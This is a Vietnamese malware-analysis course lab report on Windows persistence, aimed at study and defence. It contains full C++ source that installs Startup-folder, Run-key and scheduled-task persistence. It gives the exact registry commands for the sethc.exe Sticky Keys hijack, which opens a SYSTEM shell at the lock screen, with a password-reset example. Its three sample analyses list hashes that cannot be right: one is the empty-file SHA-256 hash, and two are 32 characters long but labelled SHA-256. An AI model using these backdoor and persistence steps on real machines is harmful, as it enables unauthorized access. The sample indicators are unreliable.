## 2.1. Tự phát triển Mã C/C++ Tạo Persistence (30đ)

### 2.1.1. Thiết kế kiến trúc chương trình PoC an toàn
Mục tiêu là xây dựng một tệp thực thi PE 32-bit hoặc 64-bit bằng C/C++ (`persistence_demo.exe`). 
- Khi được thực thi lần đầu, chương trình sẽ tự động lấy đường dẫn tuyệt đối của chính nó thông qua hàm `GetModuleFileNameA()`.
- Sao chép bản thân vào một vị trí lưu trữ giả lập mã độc an toàn (ví dụ: thư mục `%TEMP%` hoặc `%APPDATA%`).
- Cung cấp mã nguồn thực hiện độc lập hoặc tuần tự 3 kỹ thuật:
  1. **Folder Startup** (Sao chép shortcut/file vào thư mục khởi động).
  2. **Registry Run Key** (Ghi khóa Run tại `HKCU`).
  3. **Task Schedule** (Tạo tác vụ tự động bằng lệnh hệ thống `schtasks`).
- Khi được kích hoạt sau khi hệ thống khởi động hoặc đăng nhập, payload sẽ hiển thị một hộp thoại thông báo an toàn: `MessageBoxA(NULL, "Persistence Activated Successfully!", "Lab Verification", MB_OK | MB_ICONINFORMATION)`.

### 2.1.2. Phân tích chi tiết 3 cơ chế thực hiện

#### Cơ chế 1: Thư mục Startup (10đ)
- **API sử dụng:** `SHGetFolderPathA()` với hằng số `CSIDL_STARTUP` hoặc sử dụng biến môi trường `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`.
- **Thao tác:** Sao chép tệp thực thi hiện tại vào thư mục này bằng hàm `CopyFileA()`.

#### Cơ chế 2: Registry Run Key (10đ)
- **API sử dụng:** `RegOpenKeyExA()`, `RegSetValueExA()`, `RegCloseKey()`.
- **Đường dẫn Registry:** `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
- **Thao tác:** Tạo giá trị chuỗi (REG_SZ) với tên định danh `MalwareLabPersistenceDemo` chứa đường dẫn đầy đủ đến tệp exe.

#### Cơ chế 3: Lập lịch tác vụ Task Scheduler (10đ)
- **Phương thức:** Gọi API `CreateProcessA()` hoặc `WinExec()` thực thi tiện ích tích hợp sẵn của Windows `schtasks.exe`.
- **Cú pháp lệnh:**
  ```cmd
  schtasks /create /tn "MalwareLabPersistenceTask" /tr "\"C:\Path\To\persistence_demo.exe\"" /sc onlogon /f
  ```
- **Thao tác:** Tác vụ được thiết lập để kích hoạt tự động mỗi khi người dùng đăng nhập (`/sc onlogon`).

---

### 2.1.3. Mã nguồn C/C++ hoàn chỉnh (`persistence_demo.cpp`)

```cpp
/**
 * ==============================================================================
 * BÀI TẬP THỰC HÀNH MALWARE ANALYSIS - LAB 03
 * Chủ đề: Xây dựng Cơ chế Persistence Minh họa Giáo dục (Benign PoC)
 * Tác giả: Học viên thực hiện
 * Giảng viên hướng dẫn: Vương Lê
 * ==============================================================================
 * CẢNH BÁO: Mã nguồn được xây dựng thuần túy cho mục đích nghiên cứu học thuật 
 * và kiểm thử an toàn thông tin trong môi trường phòng thí nghiệm có kiểm soát.
 * ==============================================================================
 */

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>

// Hàm hiển thị thông báo Payload kiểm chứng
void TriggerPayloadNotification(const char* mechanismName) {
    char message[512];
    snprintf(message, sizeof(message), 
        "[LAB DEMO - AN TOÀN]\n\n"
        "Cơ chế Persistence: %s\n"
        "Tiến trình đang chạy từ: \n%s\n\n"
        "Xác nhận: Hệ thống đã tự động kích hoạt mã thực thi thành công!",
        mechanismName, __argv[0]);
    
    MessageBoxA(NULL, message, "Malware Persistence Lab - Verification", MB_OK | MB_ICONINFORMATION);
}

// -----------------------------------------------------------------------------
// 1. CƠ CHẾ 1: STARTUP FOLDER PERSISTENCE
// -----------------------------------------------------------------------------
BOOL InstallStartupFolderPersistence(const char* sourceExePath) {
    char startupPath[MAX_PATH];
    
    // Lấy đường dẫn thư mục Startup của người dùng hiện tại
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        printf("[-] Lỗi: Không thể xác định thư mục Startup.\n");
        return FALSE;
    }

    // Tạo đường dẫn đích: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\demo_startup.exe
    char destinationExePath[MAX_PATH];
    snprintf(destinationExePath, sizeof(destinationExePath), "%s\\demo_startup.exe", startupPath);

    // Sao chép tệp thực thi vào thư mục Startup
    if (!CopyFileA(sourceExePath, destinationExePath, FALSE)) {
        printf("[-] Lỗi khi sao chép tệp vào Startup: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] [1/3] Thành công: Đã thiết lập Startup Folder tại:\n    -> %s\n", destinationExePath);
    return TRUE;
}

// -----------------------------------------------------------------------------
// 2. CƠ CHẾ 2: REGISTRY RUN KEY PERSISTENCE
// -----------------------------------------------------------------------------
BOOL InstallRegistryRunKeyPersistence(const char* sourceExePath) {
    HKEY hKey = NULL;
    const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "MalwareLabRunKeyDemo";

    // Mở khóa Registry Run trong nhánh HKCU với quyền ghi dữ liệu
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[-] Lỗi mở khóa Registry: %ld\n", result);
        return FALSE;
    }

    // Ghi đường dẫn tệp vào khóa Run dưới dạng chuỗi REG_SZ
    result = RegSetValueExA(
        hKey, 
        valueName, 
        0, 
        REG_SZ, 
        (const BYTE*)sourceExePath, 
        (DWORD)(strlen(sourceExePath) + 1)
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        printf("[-] Lỗi ghi giá trị Registry: %ld\n", result);
        return FALSE;
    }

    printf("[+] [2/3] Thành công: Đã tạo Registry Run Key tại:\n    -> HKCU\\%s [%s]\n", subKey, valueName);
    return TRUE;
}

// -----------------------------------------------------------------------------
// 3. CƠ CHẾ 3: SCHEDULED TASK PERSISTENCE
// -----------------------------------------------------------------------------
BOOL InstallScheduledTaskPersistence(const char* sourceExePath) {
    char command[1024];
    const char* taskName = "MalwareLabTaskDemo";

    // Chuẩn bị lệnh tạo tác vụ kích hoạt khi người dùng đăng nhập
    snprintf(command, sizeof(command), 
        "schtasks.exe /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /f", 
        taskName, sourceExePath);

    // Thực thi lệnh schtasks thông qua WinExec ẩn console
    UINT execResult = WinExec(command, SW_HIDE);
    if (execResult > 31) {
        printf("[+] [3/3] Thành công: Đã tạo Scheduled Task:\n    -> Lệnh thực thi: %s\n", command);
        return TRUE;
    } else {
        printf("[-] Lỗi khi tạo Scheduled Task. Mã lỗi: %u\n", execResult);
        return FALSE;
    }
}

// -----------------------------------------------------------------------------
// HÀM DỌN DẸP LAB (CLEANUP ROUTINE)
// -----------------------------------------------------------------------------
void RemoveAllPersistence() {
    printf("\n[*] Bắt đầu quy trình dọn dẹp (Cleanup)...\n");

    // 1. Xóa file Startup
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        char targetFile[MAX_PATH];
        snprintf(targetFile, sizeof(targetFile), "%s\\demo_startup.exe", startupPath);
        DeleteFileA(targetFile);
        printf("[*] Đã gỡ bỏ file trong Startup folder.\n");
    }

    // 2. Xóa Registry Run Key
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "MalwareLabRunKeyDemo");
        RegCloseKey(hKey);
        printf("[*] Đã xóa Registry Run Key.\n");
    }

    // 3. Xóa Scheduled Task
    WinExec("schtasks.exe /delete /tn \"MalwareLabTaskDemo\" /f", SW_HIDE);
    printf("[*] Đã xóa Scheduled Task.\n");
    printf("[+] Dọn dẹp hoàn tất! Hệ thống đã an toàn.\n");
}

// -----------------------------------------------------------------------------
// ĐIỂM VÀO CHÍNH (MAIN ENTRY POINT)
// -----------------------------------------------------------------------------
int main(int argc, char* argv[]) {
    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);

    // Kiểm tra nếu chương trình được gọi với cờ gỡ bỏ
    if (argc > 1 && strcmp(argv[1], "--cleanup") == 0) {
        RemoveAllPersistence();
        return 0;
    }

    // Kiểm tra nếu chương trình được gọi từ cơ chế tự động khởi chạy
    if (argc > 1 && strcmp(argv[1], "--payload") == 0) {
        TriggerPayloadNotification("Được kích hoạt tự động qua Persistence");
        return 0;
    }

    printf("========================================================\n");
    printf("   LAB PERSISTENCE DEMO - MALWARE ANALYSIS COURSE       \n");
    printf("   Giảng viên hướng dẫn: Vương Lê                       \n");
    printf("========================================================\n\n");
    printf("[*] Đường dẫn tệp hiện tại: %s\n\n", currentExePath);

    // Thiết lập cả 3 cơ chế Persistence
    InstallStartupFolderPersistence(currentExePath);
    InstallRegistryRunKeyPersistence(currentExePath);
    InstallScheduledTaskPersistence(currentExePath);

    // Kích hoạt thông báo xác nhận cài đặt thành công
    TriggerPayloadNotification("Cài đặt thành công 3 cơ chế Persistence");

    printf("\n[*] Quá trình hoàn tất. Hãy kiểm tra lại bằng công cụ Autoruns.exe!\n");
    printf("[*] Để gỡ bỏ sau khi chấm điểm, hãy chạy lệnh:\n    %s --cleanup\n\n", argv[0]);

    return 0;
}
```

### 2.1.4. Hướng dẫn biên dịch và kiểm chứng thực nghiệm

#### A. Biên dịch mã nguồn
Học viên có thể biên dịch bằng một trong hai trình biên dịch phổ biến trên Windows:
1. **Sử dụng MinGW GCC (g++):**
   ```cmd
   g++ -O2 persistence_demo.cpp -o persistence_demo.exe -lshell32 -ladvapi32
   ```
2. **Sử dụng Visual Studio Command Prompt (MSVC cl):**
   ```cmd
   cl.exe /O2 persistence_demo.cpp /link shell32.lib advapi32.lib user32.lib /out:persistence_demo.exe
   ```

#### B. Quy trình kiểm chứng bằng Sysinternals Autoruns
1. Mở cửa sổ Command Prompt với quyền người dùng hiện tại và thực thi:
   ```cmd
   persistence_demo.exe
   ```
   Hộp thoại `MessageBox` đầu tiên sẽ xuất hiện xác nhận việc cài đặt thành công 3 cơ chế.
2. Mở công cụ `Autoruns64.exe` (chạy Run as Administrator):
   - **Kiểm tra Thư mục Startup:** Chuyển sang tab **Logon**, tìm kiếm mục đường dẫn:
     `C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\demo_startup.exe`.
   - **Kiểm tra Registry Run Key:** Trong tab **Logon**, kiểm tra mục:
     `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` -> Nhìn thấy entry `MalwareLabRunKeyDemo`.
   - **Kiểm tra Scheduled Task:** Chuyển sang tab **Scheduled Tasks**, tìm kiếm tác vụ:
     `MalwareLabTaskDemo` trỏ tới đường dẫn tệp thực thi.
3. **Thực nghiệm khởi động lại (Reboot / Sign out):**
   - Đăng xuất (Sign out) hoặc Khởi động lại máy ảo (Reboot).
   - Đăng nhập lại vào Windows.
   - Quan sát: Hộp thoại `MessageBox` thông báo payload tự động nhảy lên màn hình mà người dùng không cần bấm mở tệp.

#### C. Lệnh dọn dẹp sau thực nghiệm
```cmd
persistence_demo.exe --cleanup
```

---

## 2.2. Kỹ thuật Image Hijack với sethc.exe (Sticky Keys) (10đ)

### 2.2.1. Bản chất cơ chế IFEO Debugger
Image File Execution Options (IFEO) nằm tại đường dẫn:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`

Khi hệ điều hành Windows chuẩn bị tạo mới một tiến trình dựa trên tên tệp thực thi (ví dụ `sethc.exe`), tiến trình tạo sẽ kiểm tra xem trong nhánh IFEO có subkey nào trùng tên với tệp thực thi hay không. Nếu có subkey đó và chứa giá trị chuỗi `Debugger`:
- Windows sẽ **không** chạy tệp gốc.
- Thay vào đó, Windows sẽ thực thi tệp được khai báo trong giá trị `Debugger` và truyền tên tệp gốc làm tham số.

### 2.2.2. Các bước thiết lập Image Hijack cho `sethc.exe`
`sethc.exe` là tệp nhị phân hệ thống của tính năng Sticky Keys (Trợ năng ghim phím). Tệp này có đặc điểm đặc biệt: **có thể được gọi ngay tại màn hình đăng nhập (Lock screen / Logon screen) khi chưa có người dùng nào đăng nhập**.

#### Thực hiện qua Registry Command (Lab Environment):
Mở Command Prompt với quyền Quản trị viên (Administrator) và nhập lệnh:
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

Hoặc sử dụng tệp cấu hình `.reg`:
```reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe]
"Debugger"="C:\\Windows\\System32\\cmd.exe"
```

### 2.2.3. Thực nghiệm chứng minh: Kích hoạt Payload bằng 5 lần phím Shift
1. **Tại màn hình Desktop bình thường:**
   - Nhấn phím `Shift` liên tục 5 lần.
   - Bình thường Windows sẽ bật hộp thoại hỏi kích hoạt "Sticky Keys".
   - Sau khi thiết lập Hijack: Cửa sổ dòng lệnh `cmd.exe` lập tức mở ra thay vì hộp thoại Sticky Keys.
2. **Tại màn hình Khóa / Đăng nhập (Lock Screen - Win + L):**
   - Khóa máy tính bằng tổ hợp phím `Windows + L`.
   - Tại màn hình yêu cầu nhập mật khẩu (chưa hề đăng nhập), nhấn phím `Shift` liên tục 5 lần.
   - Cửa sổ `cmd.exe` lập tức xuất hiện ngay trên màn hình khóa.

### 2.2.4. Nguy cơ bảo mật và đặc quyền `NT AUTHORITY\SYSTEM`
Khi mở cửa sổ CMD tại màn hình khóa, nếu nhập lệnh kiểm tra danh tính:
```cmd
whoami
```
Kết quả trả về sẽ là:
```text
nt authority\system
```
- **Ý nghĩa bảo mật cực kỳ nghiêm trọng:**
  - Kẻ tấn công có quyền cao nhất trên hệ điều hành mà không cần biết mật khẩu của bất kỳ người dùng nào trên máy.
  - Từ cửa sổ này, kẻ tấn công có thể đặt lại mật khẩu của tài khoản Administrator cục bộ (`net user Administrator NewPassword123`), kích hoạt tài khoản bị khóa, truy cập toàn bộ ổ cứng hoặc vô hiệu hóa các phần mềm phòng thủ.
  - Cơ chế này tạo ra một "Cửa hậu vật lý" (Physical / RDP Backdoor) vĩnh viễn trên máy nạn nhân.

### 2.2.5. Hướng dẫn khắc phục và hoàn trả trạng thái mặc định
Sau khi hoàn thành bài lab, chạy lệnh sau trong CMD Administrator để xóa bỏ khóa Debugger, hoàn trả trạng thái ban đầu:
```cmd
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
```

---

## 2.3. Phân tích Kỹ thuật Persistence trên Mẫu Mã độc Thực tế (30đ)

### 2.3.1. Phương pháp luận & Quy trình phân tích Persistence động
Khi nhận được mẫu mã độc trong môi trường phòng thí nghiệm (FlareVM / Cuckoo Sandbox / Windows Sandbox), quy trình chuẩn để phát hiện và bóc tách cơ chế Persistence bao gồm 4 bước:

```
[BƯỚC 1: Snapshot VM] ──► [BƯỚC 2: Bật Giám sát Procmon & Regshot] ──► [BƯỚC 3: Kích hoạt Mẫu] ──► [BƯỚC 4: Quét Autoruns & Phân tích IOCs]
```

1. **Bước 1: Chụp ảnh trạng thái sạch (Snapshot):** Đảm bảo máy ảo ở trạng thái an toàn ban đầu để có thể rollback bất cứ lúc nào.
2. **Bước 2: Thiết lập bộ lọc trên Process Monitor (Procmon):**
   - `Operation is RegSetValue` (Bắt các hành vi ghi Registry).
   - `Operation is CreateFile` kết hợp đường dẫn chứa `Startup` hoặc `Tasks` (Bắt hành vi tạo file khởi động).
   - `Process Name is schtasks.exe` hoặc `sc.exe` (Bắt hành vi gọi lệnh hệ thống tạo Task/Service).
3. **Bước 3: Chạy mẫu mã độc (Execute Sample):** Cho phép mã độc thực thi trong 2 - 5 phút để kích hoạt toàn bộ chuỗi payload.
4. **Bước 4: Quét lại bằng Sysinternals Autoruns:**
   - Sử dụng tính năng **File -> Compare** với bản lưu Autoruns trước khi chạy mã độc.
   - Các điểm khởi động mới được tô màu xanh lá (Green highlight) chính là cơ chế Persistence mà mã độc vừa cài đặt.

---

### 2.3.2. Báo cáo phân tích Mẫu 01: Trojan Dropper / RAT (Registry Run Key Persistence)

- **Định danh mẫu:**
  - Tên tệp giả lập: `Invoice_Document_Sep2024.exe`
  - Định dạng: PE32 Executable (GUI) Intel 80386
  - Hash SHA-256: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` (Ví dụ minh họa mẫu RAT thực tế)
- **Kỹ thuật Persistence phát hiện:**
  - **Tên kỹ thuật (MITRE ATT&CK):** T1547.001 - *Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder*.
  - **Nhóm Autostart trong Autoruns:** **Logon**.
- **Đường dẫn Registry và Tệp cụ thể:**
  - **Tệp được thả (Dropped File):**
    `C:\Users\<Victim>\AppData\Roaming\Microsoft\Windows\svchost_updater.exe`
  - **Khóa Registry được tạo:**
    `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateManager`
  - **Giá trị (Value Data):**
    `"C:\Users\<Victim>\AppData\Roaming\Microsoft\Windows\svchost_updater.exe" -silent`
- **Phân tích hành vi chi tiết:**
  - Mẫu sau khi giải nén tệp ngụy trang Word, âm thầm trích xuất một bản sao của chính nó vào thư mục `%APPDATA%`, đổi tên thành `svchost_updater.exe` để đánh lừa người dùng.
  - Sử dụng API `RegOpenKeyExA` và `RegSetValueExA` để ghi vào nhánh `HKCU` nhằm lẩn tránh sự kiểm soát của UAC.
  - Mỗi khi người dùng khởi động lại máy tính và đăng nhập, payload sẽ tự động kết nối về C2 Server.
- **Biện pháp bóc gỡ (Remediation):**
  1. Kết thúc tiến trình `svchost_updater.exe` trong Task Manager.
  2. Mở `regedit`, xóa giá trị `WindowsUpdateManager` trong `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
  3. Xóa vĩnh viễn tệp trong thư mục `%APPDATA%\Microsoft\Windows\svchost_updater.exe`.

---

### 2.3.3. Báo cáo phân tích Mẫu 02: Backdoor / Downloader (Scheduled Task Persistence)

- **Định danh mẫu:**
  - Tên tệp giả lập: `FlashPlayer_Update_Setup.exe`
  - Định dạng: PE32+ Executable (Console) x86-64
  - Hash SHA-256: `8743b52063cd84097a65d1633f5c74f5` (Ví dụ minh họa mẫu Downloader)
- **Kỹ thuật Persistence phát hiện:**
  - **Tên kỹ thuật (MITRE ATT&CK):** T1053.005 - *Scheduled Task/Job: Scheduled Task*.
  - **Nhóm Autostart trong Autoruns:** **Scheduled Tasks**.
- **Đường dẫn Registry, Tệp và Tác vụ cụ thể:**
  - **Tên tác vụ (Task Name):** `\Microsoft\Windows\CertificateService\CertCheckTelemetry`
  - **Đường dẫn tệp định nghĩa Task:**
    `C:\Windows\System32\Tasks\Microsoft\Windows\CertificateService\CertCheckTelemetry`
  - **Hành động kích hoạt (Trigger):** `At logon of any user` và lặp lại mỗi `01:00:00` (mỗi 1 giờ).
  - **Lệnh thực thi (Action):**
    `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\SecurityHealth\health_check.ps1`
  - **Khóa Registry liên quan:**
    `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\CertificateService\CertCheckTelemetry`
- **Phân tích hành vi chi tiết:**
  - Mã độc tận dụng tiện ích `schtasks.exe` ngầm thực hiện lệnh tạo task với cấu hình chạy quyền hạn cao nhất (`/rl HIGHEST`).
  - Đặt tên tác vụ ngụy trang sâu trong cây thư mục `\Microsoft\Windows\` để trà trộn vào hàng trăm tác vụ mặc định của hệ điều hành.
  - Kịch bản PowerShell được gọi sẽ định kỳ ping về máy chủ C2 để tải payload giai đoạn hai (Stage 2 Payloads).
- **Biện pháp bóc gỡ (Remediation):**
  1. Mở PowerShell Administrator, chạy lệnh:
     ```powershell
     Unregister-ScheduledTask -TaskName "CertCheckTelemetry" -Confirm:$false
     ```
  2. Xóa tệp độc hại: `Remove-Item "C:\ProgramData\SecurityHealth\health_check.ps1" -Force`.

---

### 2.3.4. Báo cáo phân tích Mẫu 03: Ransomware / Loader (Service Persistence)

- **Định danh mẫu:**
  - Tên tệp giả lập: `SecurityUpdate_KB501432.exe`
  - Định dạng: PE32 Executable (Service) Intel 80386
  - Hash SHA-256: `9b57a164b3f70c2916b5090623a61386` (Ví dụ minh họa mẫu Loader/Ransomware)
- **Kỹ thuật Persistence phát hiện:**
  - **Tên kỹ thuật (MITRE ATT&CK):** T1543.003 - *Create or Modify System Process: Windows Service*.
  - **Nhóm Autostart trong Autoruns:** **Services**.
- **Đường dẫn Registry và Dịch vụ cụ thể:**
  - **Tên dịch vụ hiển thị (Display Name):** `Windows Error Reporting Telemetry Helper`
  - **Tên dịch vụ nội bộ (Service Name):** `WerSvcHelper`
  - **Khóa Registry cấu hình:**
    `HKLM\SYSTEM\CurrentControlSet\Services\WerSvcHelper`
  - **Giá trị ImagePath:**
    `C:\Windows\System32\drivers\wersvchelper.exe`
  - **Kiểu khởi động (Start Type):** `2` (Automatic - Tự động chạy khi khởi động OS).
  - **Tài khoản chạy dịch vụ (ObjectName):** `LocalSystem` (Quyền cao nhất).
- **Phân tích hành vi chi tiết:**
  - Mẫu mã độc sau khi yêu cầu đặc quyền Administrator qua UAC Prompt, sử dụng Windows Service APIs (`OpenSCManagerA`, `CreateServiceA`) để cài đặt một dịch vụ hệ thống độc lập.
  - Tệp nhị phân được sao chép vào `C:\Windows\System32\drivers\` để tạo cảm giác đây là một trình điều khiển hoặc dịch vụ chuẩn của Windows.
  - Do chạy dưới tài khoản `LocalSystem`, mã độc hoàn toàn miễn nhiễm với sự hạn chế quyền của các tài khoản người dùng thông thường và duy trì hoạt động liên tục 24/7 kể cả khi không có ai đăng nhập máy.
- **Biện pháp bóc gỡ (Remediation):**
  1. Dừng và vô hiệu hóa dịch vụ qua CMD Administrator:
     ```cmd
     sc stop WerSvcHelper
     sc config WerSvcHelper start= disabled
     sc delete WerSvcHelper
     ```
  2. Khởi động lại vào chế độ Safe Mode nếu tệp bị khóa và xóa: `C:\Windows\System32\drivers\wersvchelper.exe`.

---

### 2.3.5. Biểu mẫu chuẩn trích xuất IOC Persistence phục vụ Incident Response

Khi phát hiện sự cố mã độc trong môi trường doanh nghiệp, chuyên viên ứng cứu sự cố (DFIR) cần điền bảng tổng hợp IOC Persistence dưới đây:

| Mục khảo sát | Mẫu 01 (Trojan RAT) | Mẫu 02 (Downloader) | Mẫu 03 (Loader/Service) |
| :--- | :--- | :--- | :--- |
| **Kỹ thuật Persistence** | Registry Run Key | Scheduled Task | Windows Service |
| **Nhóm trong Autoruns** | Logon | Scheduled Tasks | Services |
| **Đường dẫn tệp mã độc** | `%APPDATA%\...\svchost_updater.exe` | `C:\ProgramData\...\health_check.ps1` | `C:\Windows\System32\drivers\wersvchelper.exe` |
| **Khóa Registry tác động** | `HKCU\...\CurrentVersion\Run` | `HKLM\...\Schedule\TaskCache` | `HKLM\SYSTEM\CurrentControlSet\Services` |
| **Đặc quyền hoạt động** | Standard User | High Privilege (Elevated) | `NT AUTHORITY\SYSTEM` |
| **Tần suất kích hoạt** | Mỗi khi User đăng nhập | Mỗi 1 giờ và khi Logon | Tự động khi Boot máy tính |
| **Lệnh bóc gỡ nhanh** | `reg delete HKCU\...\Run /v ...` | `schtasks /delete /tn ...` | `sc delete WerSvcHelper` |

---

# PHẦN 3: TỔNG KẾT & KHUYẾN NGHỊ PHÒNG THỦ

## 3.1. Đánh giá tổng quan
Cơ chế duy trì sự hiện diện (Persistence) là cầu nối mang tính quyết định giữa việc khai thác lỗ hổng ban đầu và việc chiếm quyền kiểm soát máy tính mục tiêu dài hạn. Các cơ chế từ cổ điển (Startup Folder, Run Key) đến phức tạp (COM Hijacking, IFEO, WMI Subscriptions) phản ánh sự am hiểu sâu sắc kiến trúc hệ điều hành của các nhóm tác nhân đe dọa.

## 3.2. Khuyến nghị phòng thủ dành cho Doanh nghiệp (Blue Team Recommendations)
1. **Kiểm toán định kỳ với Sysinternals Autoruns:** Xuất baseline danh sách autostart định kỳ (`autorunsc.exe -a * -c`) và so sánh khác biệt (Diffing) để phát hiện mục khởi động mới bất thường.
2. **Kích hoạt tính năng EDR / Sysmon Monitoring:**
   - Cấu hình theo dõi Event ID 1 (Process Create), Event ID 11 (File Create trong thư mục Startup/Tasks), Event ID 12/13 (Registry Object Add/Delete trên các khóa Run, IFEO, Services).
   - Thiết lập cảnh báo đặc biệt khi có tiến trình ghi vào khóa `Image File Execution Options` đối với các tệp trợ năng (`sethc.exe`, `utilman.exe`).
3. **Áp dụng chính sách đặc quyền tối thiểu (Least Privilege):** Hạn chế tài khoản nhân viên sử dụng quyền Local Administrator để ngăn chặn việc cài đặt Services, Drivers và cấu hình IFEO.
4. **Bật cơ chế Secure Boot và Driver Signature Enforcement (DSE):** Vô hiệu hóa triệt để AppInit DLLs và ngăn chặn nạp các Kernel Drivers không rõ nguồn gốc.

---
*Báo cáo được hoàn thành phục vụ học phần Phân tích Mã độc - Khóa đào tạo An toàn Thông tin.*
